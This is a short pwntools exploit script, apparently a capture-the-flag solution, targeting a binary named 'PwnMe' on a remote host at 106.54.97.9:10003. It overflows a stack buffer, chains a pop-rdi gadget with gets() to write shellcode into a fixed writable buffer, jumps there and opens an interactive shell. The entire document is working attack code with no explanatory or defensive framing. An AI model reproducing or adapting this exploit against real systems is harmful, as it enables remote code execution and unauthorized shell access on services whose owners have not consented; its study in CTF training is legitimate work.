from pwn import *

context.arch = 'amd64'
elf = ELF('./PwnMe')

buf = 0x404080
pop_rdi_ret = 0x40124b

r = remote('106.54.97.9', 10003)
r.recvline()
r.sendline(b'a' * 0x28 + flat([pop_rdi_ret, buf, elf.plt['gets'], buf]))
r.recvline()
r.sendline(asm(shellcraft.sh()))
r.interactive()
